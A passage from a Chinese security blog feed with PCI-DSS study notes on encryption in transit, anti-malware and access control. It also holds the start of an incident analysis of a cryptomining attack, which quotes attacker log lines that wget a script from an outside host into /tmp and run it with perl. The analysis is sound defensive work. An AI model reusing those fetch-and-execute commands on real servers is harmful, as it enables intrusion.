        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;python3-windows校园网自动拨号&quot;&gt;&lt;a href=&quot;#p
      
    
    </summary>
    
      <category term="小脚本" scheme="https://rliyuqing.github.io/categories/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
    
      <category term="小脚本" scheme="https://rliyuqing.github.io/tags/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(四)</title>
    <link href="https://rliyuqing.github.io/2019/04/15/17.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/"/>
    <id>https://rliyuqing.github.io/2019/04/15/17. PCI-DSS(V3.2.1)学习笔记(四)/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:51:29.202Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="PCI-DSS-V3-2-学习笔记-四"><a href="#PCI-DSS-V3-2-学习笔记-四" class="headerlink" title="PCI-DSS(V3.2)学习笔记(四)"></a>PCI-DSS(V3.2)学习笔记(四)</h1><hr><h1 id="二、保护持卡人数据"><a href="#二、保护持卡人数据" class="headerlink" title="二、保护持卡人数据"></a>二、保护持卡人数据</h1><h2 id="要求4：加密持卡人数据在开放式公共网络中的传输"><a href="#要求4：加密持卡人数据在开放式公共网络中的传输" class="headerlink" title="要求4：加密持卡人数据在开放式公共网络中的传输"></a>要求4：加密持卡人数据在开放式公共网络中的传输</h2><p>要求3针对的是存储的持卡人数据的保护措施，要求4则是持卡人数据传输过程中的安全措施。<br>如何保护传输中的持卡人数据呢，在我看来主要有两个方向，一个是建立一个安全的传输信道，或者利用第三方安全的传输信道传输持卡人数据，另一个就是对持卡人数据进行强效加密，保证就算攻击者拿到持卡人数据也无法翻译成明文。<br>我们具体来看看要求4中说的都有哪些吧。</p><h3 id="4-1-使用强效加密法和安全协议来保护经由公开、公共网络传输的敏感持卡人数据。"><a href="#4-1-使用强效加密法和安全协议来保护经由公开、公共网络传输的敏感持卡人数据。" class="headerlink" title="4.1 使用强效加密法和安全协议来保护经由公开、公共网络传输的敏感持卡人数据。"></a>4.1 使用强效加密法和安全协议来保护经由公开、公共网络传输的敏感持卡人数据。</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-816f73268922fb45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.1-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-83bb7ab2738254b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.1-2"><br>包括：<br>1、只接受可信任的密钥和证书<br>2、使用的协议只支持安全的版本或配置<br>3、加密强度适合所有的加密方法<br>开放式网络就是不安全的网络，这里泛指互联网，GSM，GPRS等。<br>这里就是围绕安全的信道和持卡人数据的加密来说的。我们通过一系列的方法，例如安全的协议等来构造安全的通信通道，且确保我们的配置正确，安全以及所支持的版本没有问题。<br>我们也会通过提前测试通话传输，确保传输被强效加密。强效加密我们前面也说了很多次了，但是注意我们要选取最优的加密方式，并不是加密效果越强越好，我们必须根据具体业务需要进行选择，如果一个加解密耗费三四秒，在很多地方及其影响用户体验。<br>这里特别针对TLS来说了说，最近google chrome已经对所有未加密的网站都会在地址栏上明确标记为“Not Secure”（不安全）。也就是说，如果你的网站没有采用HTTPS协议，当使用谷歌新版浏览器的用户访问网站时就会出现不安全提示。<br>另一点我们使用https的时候也要注意SSL协议的版本的安全性，确保使用安全的SSL协议的版本，使用存在漏洞版本的SSL也是极不安全的。</p><h4 id="4-1-1-确保传输持卡人数据或连接到持卡人数据环境的无线网络使用行业最优方法，以及验证和传输实施强效加密"><a href="#4-1-1-确保传输持卡人数据或连接到持卡人数据环境的无线网络使用行业最优方法，以及验证和传输实施强效加密" class="headerlink" title="4.1.1 确保传输持卡人数据或连接到持卡人数据环境的无线网络使用行业最优方法，以及验证和传输实施强效加密"></a>4.1.1 确保传输持卡人数据或连接到持卡人数据环境的无线网络使用行业最优方法，以及验证和传输实施强效加密</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-72a507c6349bc050.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.1.1"><br>针对持卡人数据可能流通的网络来说，尤其是无线网络，我们确保在这个无线环境内使用了传输的验证和强效加密。<br>为什么这里要特别说一下持卡人数据环境所连接的无线网络呢，前面已经针对在开放式网络中的安全传输的要求了。很多时候我们只注意了外部不安全网络的防护，却忽略了内部的无线网络的安全，这也是我们需要注意的。如果攻击者混入内网，或者办公网，则任科员嗅探捕获我们的持卡人数据。</p><h3 id="4-2-不要使用终端用户通讯技术（例如，电子邮件、即使通讯、短信、聊天等）来传送不受保护的PAN"><a href="#4-2-不要使用终端用户通讯技术（例如，电子邮件、即使通讯、短信、聊天等）来传送不受保护的PAN" class="headerlink" title="4.2 不要使用终端用户通讯技术（例如，电子邮件、即使通讯、短信、聊天等）来传送不受保护的PAN"></a>4.2 不要使用终端用户通讯技术（例如，电子邮件、即使通讯、短信、聊天等）来传送不受保护的PAN</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-8d3c093e07bb9c9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.2"><br>结合前面的我们知道，我们必须确保在开放式网络中通过安全的信道传输未加密，未受保护的敏感数据，我们如果通过终端用户通讯技术，我们无法保证我们通讯没有被监听，捕获。<br>如果我们使用这些终端用户通讯技术，我们确保我们传输的敏感数据，比如PAN是强效加密的，以及密钥是提前安全共享的，或确保他不可读。</p><h3 id="4-3-确保已记录、正在使用且所有相关方了解用于加密持卡人数据传输的安全政策和操作程序"><a href="#4-3-确保已记录、正在使用且所有相关方了解用于加密持卡人数据传输的安全政策和操作程序" class="headerlink" title="4.3 确保已记录、正在使用且所有相关方了解用于加密持卡人数据传输的安全政策和操作程序"></a>4.3 确保已记录、正在使用且所有相关方了解用于加密持卡人数据传输的安全政策和操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-7bdc0fa98040fe6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.3"><br>和之前的要求一样，我们有这样的保护策略，就得有详细的文件记录，并确保我们所实施的和文件的统一，以及更新保护策略时即使更新文件。并且确保和此相关的所有工作人员都已经理解并学习了整个安全政策和操作流程。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第四点要求不是很多，但是总结来说我们就是要确保我们传输的敏感数据必须在安全的信道中传输（通过安全的服务或者协议比如https），如果不能确保信道的安全，则必须使用强效的加密措施。<br>具体的第二个区域（保护持卡人数据）的两个要点也就结束了。对已存储的持卡人数据进行保护，对传输中的持卡人数据进行保护，虽然只有两个重要的环节，但是需要做的工作有很多。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-四&quot;&gt;&lt;a href=&quot;#PCI-
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(五)</title>
    <link href="https://rliyuqing.github.io/2019/04/15/18.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/"/>
    <id>https://rliyuqing.github.io/2019/04/15/18. PCI-DSS(V3.2.1)学习笔记(五)/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:51:34.937Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="PCI-DSS-V3-2-学习笔记-五"><a href="#PCI-DSS-V3-2-学习笔记-五" class="headerlink" title="PCI-DSS(V3.2)学习笔记(五)"></a>PCI-DSS(V3.2)学习笔记(五)</h1><hr><h1 id="三、维护漏洞管理计划"><a href="#三、维护漏洞管理计划" class="headerlink" title="三、维护漏洞管理计划"></a>三、维护漏洞管理计划</h1><p>维护漏洞管理计划，我们前面说了安全的网络和系统的基本建设的要求，以及保护我们的持卡人数据不被攻击者窃取等，现在要说的是如果我们做的都很好了，但是任会攻击者通过某种方法攻击我们，比如新型的病毒或者漏洞，之前看过一部电影《我是谁，没有绝对安全的系统》的确，所有系统都是人搭建的，没有绝对完美的人，也没有绝对安全的系统，我们不能做好了所有的保护措施，认为攻击者不可能窃取我们的信息了。我们搭建好了符合PCI DSS要求的保护措施，也要有应对攻击可能发生的计划，也就是说漏洞的管理计划。</p><h2 id="要求5：为所有系统提供恶意软件防护并定期更新杀毒软件或程序"><a href="#要求5：为所有系统提供恶意软件防护并定期更新杀毒软件或程序" class="headerlink" title="要求5：为所有系统提供恶意软件防护并定期更新杀毒软件或程序"></a>要求5：为所有系统提供恶意软件防护并定期更新杀毒软件或程序</h2><p>说道恶意软件我想绝对所有人都被不同程度的骚扰过。我很少使用这么偏激的程度副词，绝对，那是因为网络上的恶意软件已经铺天盖地，无孔不入。有一些只是一些骗取流量的广告，还有的甚至是通过恶意软件利用你的设备进行挖矿等，编程“肉鸡”。<br>有些针对特东漏洞的恶意软件进入我们网络后会利用系统漏洞，进行破坏，带来很大的威胁，所以对恶意软件的定期防护和杀毒软件的更新还是很有必要的！</p><h3 id="5-1-在经常受到恶意软件影响的所有系统（特别是个人电脑和服务器）中部署杀毒软件。"><a href="#5-1-在经常受到恶意软件影响的所有系统（特别是个人电脑和服务器）中部署杀毒软件。" class="headerlink" title="5.1 在经常受到恶意软件影响的所有系统（特别是个人电脑和服务器）中部署杀毒软件。"></a>5.1 在经常受到恶意软件影响的所有系统（特别是个人电脑和服务器）中部署杀毒软件。</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-85162301e7ae0f31.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.1"><br>对于可能会被恶意软件入侵的系统，特别是个人电脑，服务器。我们要部署特定的杀毒软件，当然这个杀毒软件的实时更新是很有必要的，因为很多都是利用0day漏洞进行攻击，杀毒软件的实时更新极为重要，必要时需要手工测试，分析。</p><h4 id="5-1-1-确保杀毒程序能检测、删除并阻止所有已知类型的恶意软件"><a href="#5-1-1-确保杀毒程序能检测、删除并阻止所有已知类型的恶意软件" class="headerlink" title="5.1.1 确保杀毒程序能检测、删除并阻止所有已知类型的恶意软件"></a>5.1.1 确保杀毒程序能检测、删除并阻止所有已知类型的恶意软件</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-97ae310ffbbe81dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.1.1"><br>这就是确保我们选取的杀毒软件的强大性，选择一款好的杀毒软件很重要，虽然这听着像是广告，但是功能上有盲点的杀毒软件就和有短板的水桶一样，其他东西在高，有一个短板，攻击者便可以轻松实施攻击手段。<br>所有我们要确保我们使用的杀毒软件能够阻止所有类型和形式的恶意软件。</p><h4 id="5-1-2-对于通常不收恶意软件影响的系统，需要执行定西评估已确定并评估不断进化的恶意软件的威胁，从而确认这些系统是否仍不需要使用杀毒软件。"><a href="#5-1-2-对于通常不收恶意软件影响的系统，需要执行定西评估已确定并评估不断进化的恶意软件的威胁，从而确认这些系统是否仍不需要使用杀毒软件。" class="headerlink" title="5.1.2 对于通常不收恶意软件影响的系统，需要执行定西评估已确定并评估不断进化的恶意软件的威胁，从而确认这些系统是否仍不需要使用杀毒软件。"></a>5.1.2 对于通常不收恶意软件影响的系统，需要执行定西评估已确定并评估不断进化的恶意软件的威胁，从而确认这些系统是否仍不需要使用杀毒软件。</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-0b769d6ccdc360bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.1.2"><br>我们前面对那些可能遭到恶意软件入侵的系统都安全了功能强大的杀毒软件，但是那些被我们规定为不可能遭到恶意软件的系统是否会一直是安全的呢。<br>在我们业务变动的时候可能系统的配置会发生改变，可能会由安全变得不安全，或者恶意软件的入侵能力因为某些条件便强，使得原本不受威胁的系统现在受威胁。<br>上面这两个条件的发生是极为可能的，所以我们要定期对这些不受威胁的系统进行评估，确保他们仍然不受威胁。这个定期可能是一个周期，但是当业务变动导致系统配置发生变化，和恶意软件的重要进化发生时也必须进行重新评估。</p><h3 id="5-2-确保所有杀毒软件按如下方式维护"><a href="#5-2-确保所有杀毒软件按如下方式维护" class="headerlink" title="5.2 确保所有杀毒软件按如下方式维护"></a>5.2 确保所有杀毒软件按如下方式维护</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-7579a16f2d956656.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.2"><br>1、保持为最新<br>2、执行定期扫描<br>3、生成检查日志（PCI DSS要求10.7规定保留）<br>三个维护要求，通过配置自动更新保持为最新，就是为了保证不会出现新的短板，导致服务器被恶意软件入侵；配置执行定期扫描，这个就不用说了，杀毒软件就得定期的扫描。生成检查日志呢，这个也很重要。我们可以通过日志查看到我们监控病毒或恶意软件的活动以及反恶意软件的效果。</p><h3 id="5-3-确保杀毒机制积极运行且无法被用户禁用或更改，除非管理人员根据具体情况作出有时间限制的明确授权"><a href="#5-3-确保杀毒机制积极运行且无法被用户禁用或更改，除非管理人员根据具体情况作出有时间限制的明确授权" class="headerlink" title="5.3 确保杀毒机制积极运行且无法被用户禁用或更改，除非管理人员根据具体情况作出有时间限制的明确授权"></a>5.3 确保杀毒机制积极运行且无法被用户禁用或更改，除非管理人员根据具体情况作出有时间限制的明确授权</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-394fe7f76e40e067.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.3"><br>我们在要求1中的最后也曾看到过类似的要求：对于一些便携式计算设备要加防火墙并使用户自己无法更改。这里也是类似的，但也有不同。<br>我们是针对所有可能被恶意软件入侵的系统，我们在安装了杀毒软件之后，要确保这些软件一直是处于运行，且非管理人员无法更改的状态。而且只有有合理的技术或业务需要时才能在获得管理人员的批准，并且进行了其他的安全保护措施之后才能可以暂时的一定时间的禁用杀毒软件。</p><h3 id="5-4-确保已记录、正在使用且所有相关方了解为系统提供恶意软件防护的安全政策和操作程序"><a href="#5-4-确保已记录、正在使用且所有相关方了解为系统提供恶意软件防护的安全政策和操作程序" class="headerlink" title="5.4 确保已记录、正在使用且所有相关方了解为系统提供恶意软件防护的安全政策和操作程序"></a>5.4 确保已记录、正在使用且所有相关方了解为系统提供恶意软件防护的安全政策和操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-2ef402f3ff7b10a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.4"><br>确保我们的提供恶意软件保护的这个机制有详细的文件记录，且相关人员已经进行了学习，并严格按照这个记录文件的标准进行执行。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于提供杀毒软件保护的策略我们也进行学习了，这个可能博主经历的也比较少，主要都是个人PC端的杀毒软件保护，没有正真体验过公司内部的情况，所以自己的看法也有些粗鄙。但是0day还是看过很多的。记得前不久有一个GhostScript沙箱绕过的漏洞，影响了最新版本的imagemaick，可以远程命令执行，当时很多大公司都出现了问题，包括新浪，百度贴吧，博主身边的朋友用这个POC也混了不少src的奖金。另外，就今天看到一个分享CVE-2018-3191的WebLogic的远程代码指定漏洞被灰产做成了批量攻击工具，又被捕获了一大批肉鸡。所以杀毒软件的更新是很重要的，因为我们无法避免0day的产生，所以要保证我们的响应速度最快，也得保证我们使用的杀毒软件的工具为最新的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-五&quot;&gt;&lt;a href=&quot;#PCI-
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(七)</title>
    <link href="https://rliyuqing.github.io/2019/04/15/20.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/"/>
    <id>https://rliyuqing.github.io/2019/04/15/20. PCI-DSS(V3.2.1)学习笔记(七)/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:51:47.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="PCI-DSS-V3-2-学习笔记-七"><a href="#PCI-DSS-V3-2-学习笔记-七" class="headerlink" title="PCI-DSS(V3.2)学习笔记(七)"></a>PCI-DSS(V3.2)学习笔记(七)</h1><hr><h1 id="四、实施强效的访问控制"><a href="#四、实施强效的访问控制" class="headerlink" title="四、实施强效的访问控制"></a>四、实施强效的访问控制</h1><p>PCI DSS的第四个区域就是实施强效的访问控制，这里的访问控制不仅仅是前面提到的针对某个系统的访问控制，而是针对持卡人数据环境的所有访问来说的；不仅仅是某些具体的业务，应用程序，还有系统组件以及物理的访问等等统统要在我们的访问控制的措施保护之内。</p><h2 id="要求7-：按业务知情需要限制持卡人数据的访问"><a href="#要求7-：按业务知情需要限制持卡人数据的访问" class="headerlink" title="要求7 ：按业务知情需要限制持卡人数据的访问"></a>要求7 ：按业务知情需要限制持卡人数据的访问</h2><p>按业务的知情需要，知情需要，我的理解就是能保证工作人员正常执行工作职责的最小权限。也正好就是我们上面提到的最小权限原则，只授予用户必要的权限，不要过度授权，这样也减少系统、网络、应用、数据库出错的机会。</p><h3 id="7-1-仅有工作人员需要的个人才能访问系统组件和持卡人数据"><a href="#7-1-仅有工作人员需要的个人才能访问系统组件和持卡人数据" class="headerlink" title="7.1 仅有工作人员需要的个人才能访问系统组件和持卡人数据"></a>7.1 仅有工作人员需要的个人才能访问系统组件和持卡人数据</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-bc86ab515c17ec7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1"><br>首先我们要减少对持卡人数据的访问，只有那些有工作需要并且有明确授权的用户才能访问持卡人数据所在的环境的系统组件或者持卡人数据。<br>对于我们怎么才能控制因为工作需要且有明确授权的用户访问呢，我们需要有一定的访问控制流程来实现，至少满足下面的这些要求（7.1.1+7.1.4）</p><h4 id="7-1-1-为每个角色定义访问需要"><a href="#7-1-1-为每个角色定义访问需要" class="headerlink" title="7.1.1 为每个角色定义访问需要"></a>7.1.1 为每个角色定义访问需要</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-76c1881aa088b2cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.1"><br>包括：<br>1、每个角色依据工作职能需要访问的系统组件和数据资源<br>2、访问资源所需的全线级别（例如，用户、管理员等）<br>我们之前已经用到了用户和用户组的管理方法来进行网络组建的管理，罪域每个用户，每个角色我们根据每个角色的需求来确定他是否对一个系统组件或者数据有访问权限。<br>比如我们一个测试人员，他应该只对测试环境的数据和组件有访问权限，对线上的数据没有访问需求，也就不分配访问权限。<br>我们要根据每一个角色工作和业务需要授予他必要的权限，在确保最先权限的原则的同时我们要保证授予的权限足够角色进行正常的工作。</p><h5 id="7-1-2-将特权用户ID的访问权限限制为指定工作职责所需的最小权限"><a href="#7-1-2-将特权用户ID的访问权限限制为指定工作职责所需的最小权限" class="headerlink" title="7.1.2 将特权用户ID的访问权限限制为指定工作职责所需的最小权限"></a>7.1.2 将特权用户ID的访问权限限制为指定工作职责所需的最小权限</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-fcbd367bca16a103.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.2-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-bc07a84a0e48a3ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.2-2"><br>特权用户ID就是指的某些应用程序或者服务的特权用户，比如数据库的管理员，备份管理员。在默认情况下这些应用程序或者服务的特权用户可能会拥有超出他所需要执行工作之外的权限；所有我们要对这些特权用户进行授权管理，确保分配给他们的权限也符合最小权限原则。</p><h4 id="7-1-3-基于个人的工作分类和职能分配访问权限"><a href="#7-1-3-基于个人的工作分类和职能分配访问权限" class="headerlink" title="7.1.3 基于个人的工作分类和职能分配访问权限"></a>7.1.3 基于个人的工作分类和职能分配访问权限</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-2016b312ac935202.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.3"><br>就是对于个人的工作和职能累分配权限。在我们以及定义了觉得的访问需求之后，我们需要将这个需求转化为对应的权限，我们就可以根据之前定义和角色来赋予个人访问权限。</p><h4 id="7-1-4-需要制定所需权限的被授权方作出书面批准"><a href="#7-1-4-需要制定所需权限的被授权方作出书面批准" class="headerlink" title="7.1.4 需要制定所需权限的被授权方作出书面批准"></a>7.1.4 需要制定所需权限的被授权方作出书面批准</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-9cb821f90460a686.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.4"><br>对于对个人进行赋予对用的角色的操作我们需要有一定的记录，以供检查，确保我们授予的权限和分配给个人的角色匹配。</p><h3 id="7-2-为系统组件监理访问控制系统，以根据用户的知情需要限制访问，并将系统设为“全部拒绝”，特别允许访问时除外"><a href="#7-2-为系统组件监理访问控制系统，以根据用户的知情需要限制访问，并将系统设为“全部拒绝”，特别允许访问时除外" class="headerlink" title="7.2 为系统组件监理访问控制系统，以根据用户的知情需要限制访问，并将系统设为“全部拒绝”，特别允许访问时除外"></a>7.2 为系统组件监理访问控制系统，以根据用户的知情需要限制访问，并将系统设为“全部拒绝”，特别允许访问时除外</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d2f6bb8460f07d61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.2"><br>这就是白名单的思想，我们为系统组件建立访问控制的系统，默认是所有的人都不能访问，然后建立白名单，只有特别允许访问的才能访问。<br>该访问控制系统必须包含以下内容：</p><h4 id="7-2-1-所有系统组件范围"><a href="#7-2-1-所有系统组件范围" class="headerlink" title="7.2.1 所有系统组件范围"></a>7.2.1 所有系统组件范围</h4><h4 id="7-2-2-基于工作分类和职能为个人分配权限"><a href="#7-2-2-基于工作分类和职能为个人分配权限" class="headerlink" title="7.2.2 基于工作分类和职能为个人分配权限"></a>7.2.2 基于工作分类和职能为个人分配权限</h4><h4 id="7-2-3-将“拒绝全部”设为默认配置"><a href="#7-2-3-将“拒绝全部”设为默认配置" class="headerlink" title="7.2.3 将“拒绝全部”设为默认配置"></a>7.2.3 将“拒绝全部”设为默认配置</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-f3112c99ecf6eb19.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.2.1-7.2.3"><br>对于这个系统组件的访问控制系统我们必须要保证至少达到上面三个要求。<br>首先确保所有的系统组件在我们的访问控制系统的保护内，然后我们确定我们这个访问控制系统已经根据PCI DSS的要求为个人分配了权限，最后我们要保证默认设置是默认是“DENY ALL”，拒绝所有，使用白名单会比黑名单安全很多。</p><h3 id="7-3-确保已记录、正在使用且所有相关方了解用于持卡人数据访问的安全政策和操作程序"><a href="#7-3-确保已记录、正在使用且所有相关方了解用于持卡人数据访问的安全政策和操作程序" class="headerlink" title="7.3 确保已记录、正在使用且所有相关方了解用于持卡人数据访问的安全政策和操作程序"></a>7.3 确保已记录、正在使用且所有相关方了解用于持卡人数据访问的安全政策和操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-cf5f8190b03c8dc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.3"><br>每一个要求的最后都有一个这样的小要求。我们要确保我们制定的限制对持卡人数据访问的方案有详细的记录，并且相关的工作人员都已经学习，并严格遵守。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说要求7主要提到三个思想，第一个是最小权限的原则，第二个是对个人使用已创建的角色来赋予权限的思想，第三个就是白名单的思想了。<br>最小权限就不说了前面提了很多次。说说第二个，这个就是我们首先定义每个角色，比如，测试员，操作员，监控员这样不同的角色，同时对每个角色定义所需的访问需求，明确角色和相对应的访问需求后（比如监控员只查看所有的配置的权限，没有更改的权限），这样我们就可以根据个人的工作职能来授予访问权限了。白名单呢，在很多方面是比黑名单更加安全的，我们默认拒绝所有的，只接受我们认为安全的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-七&quot;&gt;&lt;a href=&quot;#PCI-
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>一次挖矿病毒攻击分析</title>
    <link href="https://rliyuqing.github.io/2019/04/15/24.%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    <id>https://rliyuqing.github.io/2019/04/15/24.一次挖矿病毒攻击分析/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:52:16.198Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="一次挖矿病毒攻击分析"><a href="#一次挖矿病毒攻击分析" class="headerlink" title="一次挖矿病毒攻击分析"></a>一次挖矿病毒攻击分析</h1><hr><p>这两天期末了，最近老板这里突然来了个任务，客户服务器被攻击了，某台机器的cpu一直都跑满了，持续高负荷状态，客户公司的运营实在没有办法找到了我们。<br>先说一说之前这台服务器也出现过问题，被两波人搞过，一波写了webshell，另个一种了挖矿病毒，都被清除了，当然这些我都没有参与。<br>因为老板比较忙，我和另一个小伙伴接手进行分析，我们拿到这台服务器，既然是web服务器，最好得最有效的办法就是看web日志，但是这个日志是在很多，这就考虑经验问题了，另一个小伙伴道行比我深，他发现了痕迹：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat aso_access.log | grep <span class="string">"wget"</span> | grep <span class="string">"/2019"</span>|grep <span class="string">"200"</span></span><br></pre></td></tr></table></figure></p><p>通过很多尝试，在筛选“wget”的时候找到了攻击痕迹。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - - [xx/xx/2019:xx:xx:xx +0800] <span class="string">"POST /?module=wget [http://xxx.xxx.xxx.xxx/ibus](http://xxx.xxx.xxx.xxx/ibus) -O /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 2979 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p><p>emmmmm，看到这个POST的请求，基本可以猜测出就是这几天爆出的thinkphp新的rce，具体读者可以去看看相关的报告，rce的分析网上也有了，有想去的可以去了解一下。根据这条日志，筛选ip我们找到了具体的攻击痕迹：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - - [xx/xx/2019:xx:xx:xx +0800] <span class="string">"POST /?module=wget [http://xxx.xxx.xxx.xxx/ibus](http://xxx.xxx.xxx.xxx/ibus) -O /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 2979 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p><p>上传ibus脚本文件到tmp目录下命名为指定文件，这里www用户有对tmp目录的读写权限。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - -  [xx/xx/2019:xx:xx:xx +0800]  <span class="string">"POST /?module=perl /tmp/6b5a412bb56c0f0af33017cc88718de3;sleep 2;rm -rf /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 3699 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p><p>执行tmp中上传的指定文件，并等待执行完成，删除文件.<br>本地虚拟环境执行了一下这个ibus脚本：<br><img 